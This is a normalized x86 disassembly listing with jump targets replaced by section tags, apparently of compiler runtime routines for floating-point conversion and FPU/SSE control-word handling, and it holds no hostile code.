mov ecx [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x2c ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x2c ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
cmp di 0x7fff
mov esi [ ebp - 0x4c ]
jae r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov cx [ ebp - 0x2a ]
mov [ ebp - 0x3c ] cx
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x3a ] ecx
mov ecx [ ebp - 0x24 ]
or edi eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] di
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x22 ] 0xffff
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] 0x8000
inc edi
jmp r-xdata
sub_422910
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
test cx cx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x6c ] ecx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx 0x7fff
jne r-xdata
test esi esi
jne r-xdata
test dx dx
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx ecx ax
movsx ebx cx
mov [ ebp - 0x4c ] ecx
xor eax eax
mov ecx rw-data
neg ebx
sub ecx 0x60
cmp ebx eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x20 ] ax
mov [ ebp - 0x68 ] ecx
je r-xdata
mov eax 0x80000000
cmp esi eax
mov [ ebx ] 0x1
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
cmp cx 0x3fff
mov ebx 0x7fff
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
and [ ebx ] di
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov ecx [ ebp - 0x4c ]
mov [ edx ] cx
je r-xdata
mov esi [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
movzx edx cx
mov ecx esi
xor ecx edx
and edx ebx
and esi ebx
and ecx 0x8000
cmp dx bx
lea edi [ esi + edx ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
movzx edi di
jae r-xdata
cmp ebx eax
je r-xdata
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x68 ] ecx
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
push 0x15
pop ecx
cmp [ ebp + 0x14 ] ecx
jle r-xdata
movsx ecx cx
add [ ebp + 0x14 ] ecx
cmp [ ebp + 0x14 ] eax
jg r-xdata
neg cx
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
cmp si bx
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_405b8a
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
push 0x8
sub esi 0x3ffe
mov [ ebp - 0x16 ] ax
pop ebx
mov [ ebp + 0x14 ] ecx
and [ edx ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
cmp di 0xbffd
ja r-xdata
test ebx ebx
jne r-xdata
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
cmp [ ecx ] 0x8000
mov [ ebp - 0x64 ] ecx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
mov eax [ ebp - 0x20 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add edi edi
or edi eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp di 0x3fbf
ja r-xdata
xor eax eax
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x16 ]
xor eax eax
mov ecx edi
mov esi 0x7fff
xor ecx edx
and edx esi
and edi esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
and ecx 0x8000
cmp dx si
lea eax [ edi + edx ]
movzx eax ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x64 ] eax
mov ecx eax
push r--data
push r--data
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc eax
test eax eax
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
cmp dx ax
jne r-xdata
mov [ ebp - 0x18 ] eax
jmp r-xdata
neg cx
sbb ecx ecx
and [ ebp - 0x1c ] 0x0
and ecx 0x80000000
add ecx 0x7fff8000
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x18 ] ecx
cmp di si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_405b8a
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
test esi esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] eax
jg r-xdata
cmp si ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
cmp ax 0xbffd
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ax 0x3fbf
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
cmp ebx [ ebp - 0x40 ]
mov eax [ ebp - 0x60 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
cmp edx esi
mov [ ebp - 0x44 ] edx
jb r-xdata
inc eax
inc eax
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea esi [ ebp - 0x28 ]
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x48 ] edx
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
cmp ebx ecx
mov eax [ ebp - 0x60 ]
jae r-xdata
inc ecx
test edx edx
mov esi eax
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov edx [ ebp - 0x54 ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add edi 0xc002
xor eax eax
cmp di ax
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx edx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp di si
jne r-xdata
inc eax
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
and [ eax ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add edi 0xffff
cmp di ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x48 ] 0x2
sub [ ebp - 0x5c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ eax ]
cmp [ ebp - 0x44 ] 0x0
mov [ eax - 0x4 ] ebx
je r-xdata
lea edi [ ebp - 0xc ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] 0x5
mov edx [ ebp - 0x64 ]
inc eax
test [ edx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
cmp di ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add ebx ebx
or ebx edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add edi 0xffff
cmp di ax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x48 ]
movzx esi [ esi ]
movzx edx [ edx ]
and [ ebp - 0x44 ] 0x0
imul edx esi
mov esi [ eax - 0x4 ]
lea ebx [ esi + edx ]
cmp ebx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x5c ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
mov [ ebp - 0x44 ] edi
jg r-xdata
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x64 ]
add edx 0x8
mov [ ebp - 0x54 ] edx
cmp [ edx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr ebx 0x1
or ebx edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x58 ]
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add eax 0xc002
test ax ax
jle r-xdata
mov [ ebp - 0x70 ] 0x1
cmp esi edx
jae r-xdata
cmp [ edx ] esi
jne r-xdata
mov [ ebp - 0x16 ] si
jmp r-xdata
inc [ ebp - 0xe ]
cmp [ ebp - 0xa ] 0xffffffff
mov [ ebp - 0xe ] eax
jne r-xdata
cmp di 0x7fff
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x58 ] eax
je r-xdata
add eax 0xffff
test ax ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x58 ] 0x2
sub [ ebp - 0x54 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x70 ] 0x0
mov edi [ ebp - 0x44 ]
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov ax [ ebp - 0xe ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
or edi ecx
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
neg cx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
cmp [ ebp - 0x6 ] 0xffff
mov [ ebp - 0xa ] eax
jne r-xdata
or [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov edx eax
neg edx
movzx edx dx
mov [ ebp - 0x44 ] edx
add eax edx
test ax ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add edi edi
or edi edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add eax 0xffff
test ax ax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x58 ]
mov esi [ ebp - 0x54 ]
movzx esi [ esi ]
movzx edx [ edx ]
mov edi [ edi - 0x4 ]
imul edx esi
and [ ebp - 0x70 ] 0x0
lea esi [ edi + edx ]
cmp esi edi
jb r-xdata
xor eax eax
jmp r-xdata
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc edi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr edi 0x1
or edi edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec [ ebp - 0x44 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
mov dx [ ebp - 0xe ]
mov [ ebp - 0x20 ] dx
mov edx [ ebp - 0xc ]
mov [ ebp - 0x1e ] edx
mov edx [ ebp - 0x8 ]
or eax ecx
mov [ ebp - 0x1a ] edx
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
cmp [ ebp - 0x6 ] 0xffff
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc eax
jmp r-xdata
sub_4231d6
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
test ebx 0x40000
pop esi
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_423264
xor eax eax
test dl 0x10
je r-xdata
test dl 0x8
push ebx
push esi
push edi
mov ebx 0x200
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
test edx 0x80000
mov edi 0x100
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
cmp edx 0x1000000
pop esi
pop ebx
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_423304
sub esp 0x10
push ebx
push ebp
push esi
push edi
fwait
fnstcw [ esp + 0x14 ]
mov ebx [ esp + 0x14 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov edi 0xc00
and eax edi
mov ebp 0x300
mov esi 0x200
je r-xdata
or edx 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx esi
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov eax esi
not eax
and eax edx
and ecx esi
or eax ecx
cmp eax edx
mov [ esp + 0x1c ] eax
je r-xdata
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx esi
jmp r-xdata
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx eax
call sub_4231d6
movzx eax ax
mov [ esp + 0x10 ] eax
fldcw [ esp + 0x10 ]
fwait
fnstcw [ esp + 0x10 ]
mov ebx [ esp + 0x10 ]
xor edx edx
test bl 0x1
je r-xdata
or edx ebp
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
and esi 0x308031f
mov edi esi
stmxcsr [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
xor esi esi
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test ax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test ax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test ax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test ax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test ax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax edi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebp 0x6000
and ecx ebp
je r-xdata
or esi 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax edx
mov [ esp + 0x1c ] edx
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax edi
jne r-xdata
call sub_423264
push eax
mov [ esp + 0x2c ] eax
call sub_4237d3
pop ecx
stmxcsr [ esp + 0x28 ]
mov eax [ esp + 0x28 ]
xor edx edx
test al al
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebp
jne r-xdata
or edx ebp
jmp r-xdata
mov edi 0x200
test edi eax
je r-xdata
push 0x10
pop edx
mov ecx [ esp + 0x1c ]
mov edx eax
xor edx ecx
or eax ecx
test edx 0x8031f
je r-xdata
mov edx edi
and edi [ esp + 0x24 ]
not edx
and edx esi
or edx edi
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ax 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ax 0x800
je r-xdata
or edx 0x4
test ax 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi eax
je r-xdata
or edx 0x1
mov ecx eax
and ecx ebp
je r-xdata
or edx 0x80000
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x2000000
sub eax 0x7fc0
je r-xdata
or edx esi
cmp ecx 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or edx edi
jmp r-xdata
cmp ecx ebp
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_423607
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
cmp edi esi
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
test ebx ecx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
cmp [ ebp - 0x14 ] ebx
mov [ eax ] edi
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
cmp esi ecx
mov [ ebp - 0x10 ] edx
jb r-xdata
inc [ eax + 0x8 ]
test esi esi
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
test ebx ebx
mov [ eax + 0x4 ] esi
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
test edx edx
mov [ eax + 0x4 ] ecx
je r-xdata
sub_4237d3
push 0x8
push r--data
call sub_405770
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_4057b5
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
